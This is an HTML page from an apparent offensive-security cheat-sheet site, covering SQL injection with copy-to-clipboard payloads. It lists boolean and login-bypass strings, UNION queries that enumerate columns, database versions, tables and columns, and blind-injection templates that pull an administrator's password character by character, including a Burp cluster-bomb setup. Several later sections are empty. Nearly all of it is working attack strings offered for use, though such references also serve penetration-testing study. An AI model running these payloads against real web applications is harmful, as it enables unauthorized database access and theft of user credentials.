<!DOCTYPE html>
<html lang="en-US">
<head>
<link rel="icon" type="image/x-icon" href="/machete/conf/LOGO01.png">
<link rel="stylesheet" type="text/css" href="/machete/conf/machete_style_offensive_sections.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
	<script>
		function ctrl_C(element) {
  		var $temp = $("<input>");
  		$("body").append($temp);
  		$temp.val($(element).text()).select();
  		document.execCommand("copy");
  		$temp.remove();
		alert("copied to clipboard.");
	}	
	</script>
  <title> M A C H E T E </title>
  <!--------------------->
  <!-- b0ydC Founder -->
  <!-- --------------- -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8" />

</head>
<body>
<br>
<a href="/machete/index.html"><img src="/machete/conf/letter_logo.jpg" alt="LOGO" style="width:20%;"></a>
<br>
<center>
<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
    <a href="/machete/offensive.html">OFFENSIVE</a> |
    <a href="/machete/defensive.html">DEFENSIVE</a> |
    <a href="/machete/tools.html">TOOLS</a> |
    <a href="/machete/about.html">ABOUT</a> 
</div> 

<p class="titulos"><mark>[SQL INJECTION]</mark></p>
<div>
<pre>
<div class="column" style="display: inline-block; text-align: left; background-color:gray;">
<button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" style="float: left;">&lt;&lt;</button><br><br>
<details>
<summary>HIDDEN DATA TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> It will use some boolean conditions in order to retrieve content from the database.

If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean 
conditions are used.
	
<b>C1: TRUE </b><p id="HDT01"><mark>' OR 1=1--</mark></p>
<b>C2: TRUE </b><p id="HDT02"><mark>' and 'a'='a--</mark></p>
<b>C3: FALSE </b><p id="HDT03"><mark>' and 1=2;--</mark></p>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button></p>
</details>
<details>
<summary>LOGIN BYPASS TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.

<u>SAMPLE:</u>
	
<b>C1: </b><p id="LBT01"><mark>administrator'--</mark></p> 
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LBT01')">.C1.</button></p>
</details>
<details>
<summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> Techniques used to retrieve the database version, columns number, field type, etc.

<b>--</b> or <b>#</b> | Are used in SQL query language to comment ignoring the rest of the query. <br>
	
<b>PRE-REQS:</b>
<u>1. get column number</u>

<b>C1: METHOD </b><p id="DTT01"><mark>' ORDER BY 1--</mark></p> 
<b>C2: METHOD </b><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT01')">.C1.</button> |  <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT02')">.C2.</button><br>
	
<u>2. get field type</u>
	
<b>C1: STRING TEST</b><p id="DTT03"><mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark></p>
<b>C2: STRING TEST</b><p id="DTT04"><mark>' UNION SELECT NULL,'a',NULL,NULL--</mark></p>
<b>C3: ORACLE TEST</b><p id="DTT05"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT05')">.C3.</button>
<br>
<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
is needed. Also, for ORACLE the select statement <u>is needed a table to search from</u>, it can be any table.
	
<b>COMMON TESTS:</b>

<u><b>ORACLE:</b></u>

<b>C1: </b><p id="DTT06"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p> 
<b>C2: </b><p id="DTT07"><mark>' UNION SELECT banner,NULL FROM v$version--</mark></p> 
*assuming it has two columns and both are type string.

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT07')">.C2.</button><br>
	
<u><b>MYSQL | SQL:</b></u>

<b>C1: </b><p id="DTT08"><mark>' UNION SELECT @@version,NULL#</mark></p> 
*assuming it has two columns and first is type string.

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT08')">.C1.</button><br>
<b>POSTGRESQL:</b>

</p>
</details>
<details>
<summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> Used to retrieve the name of table, columns, etc. to retrieve content from database. 
<details>
<summary>NON-ORACLE</summary>
<b>PRE-REQS:</b>
1. get column number
2. get field type

*after that information is collected, it is time to retrieve the <b>TABLE_NAME</b> of the database schema.

<b>C1: </b><p id="LDCT01"><mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark></p> 
*once table is identified, it is time to retrieve the <b>COLUMNS</b> of the table

<b>C2: </b><p id="LDCT02"><mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark></p> 
*once table_name and columns are identified, it is time to retrieve the <b>CONTENT</b>

<b>C3: </b><p id="LDCT03"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p> 

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT03')">.C3.</button>
<br>
</details>
<details>
<summary>ORACLE</summary>
<b>PRE-REQS:</b>
1. get column number
2. get field type

*after that information is collected, it is time to retrieve the <b>TABLE_NAME</b> of the database schema.

<b>C1: </b><p id="LDCT04"><mark>' UNION SELECT table_name,NULL from ALL_TABLES--</mark></p>
*once table is identified, it is time to retrieve the <b>COLUMNS</b> of the table

<b>C2: </b><p id="LDCT05"><mark>' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark></p>
*once table_name and columns are identified, it is time to retrieve the <b>CONTENT</b>

<b>C3: </b><p id="LDCT06"><mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark></p>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT06')">.C3.</button></p>
</details>
<b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has
two columns and both type string.</p>
</details>
<details>
<summary>UNION ATTACKS TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
from other tables.

<b>STEP1:</b> get query columns number

<b>C1: </b><p id="UAT01"><mark>' UNION SELECT NULL--</mark></p>
*add null values until the error disappears

<b>STEP2:</b> get column field type

<b>C2: non-oracle </b><p id="UAT02"><mark>' UNION SELECT NULL,'a'--</mark></p>
<b>C3: oracle</b><p id="UAT03"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p>
*assuming two columns

... after those steps, please refer to <b>LISTING DATABASE CONTENT TECHNIQUES</b>, it will apply the same.

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#UAT03')">.C3.</button></p>
</details>
<details>
<summary>BLIND ATTACKS TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. Look for any 
new behavior after small changes. Inspect the headers in burpsuite to check if exist something querying the application. 
<details>
<summary>CONDITIONAL RESPONSES</summary>	
<b>C1: TRUE</b><p id="BAT01"><mark>' AND '1'='1</mark></p>
<b>C2: FALSE</b><p id="BAT02"><mark>' AND '1'='2</mark></p>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT02')">.C2.</button>

To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.<br>

<u>check if table exist ?</u>
	
<b>C1: TRUE condition means table exist !</b><p id="BAT03"><mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark></p>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT03')">.C1.</button>

<u>check if column value exist ?</u>

<b>C1: TRUE condition means column value exist ![guess or enumerate]</b><p id="BAT04"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark></p>
<b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> 

<u>check the character lenght of the column ?</u>
<b>C1: </b><p id="BAT06"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark></p>
<b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT06')">.C1.</button>

<b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
hits the FALSE statement.

> <u>check the characters of the column ?</u>
<b>C1: </b><p id="BAT08"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark></p>
<b>SAMPLE: </b><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT08')">.C1.</button>

So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to
iterate more times with each letter, number, etc. For that reason a pre-req is to know the value lenght. 

<b><u>CLUSTER BOMB ATTACK !</u></b> - two positions

<b>C1: </b><p id="BAT10"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark></p>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT10')">.C1.</button>

<b>NOTE:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
values are correct = TRUE. 
</details>
<details>
<summary>CONDITIONAL ERRORS</summary>

</details>	
</p>
</details>
<details>
<summary>ERROR-BASED TECHNIQUES</summary>
<p><b>DESCRIPTION: </b></p>
</details>
<details>
<summary>ENCODING ATTACK TECHNIQUES</summary>
<p><b>DESCRIPTION: </b></p>
</details>
</div>
</pre>
<button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
</div>
<p class="titulos">©® - 2023.</p>
</center>
</body>
</html>
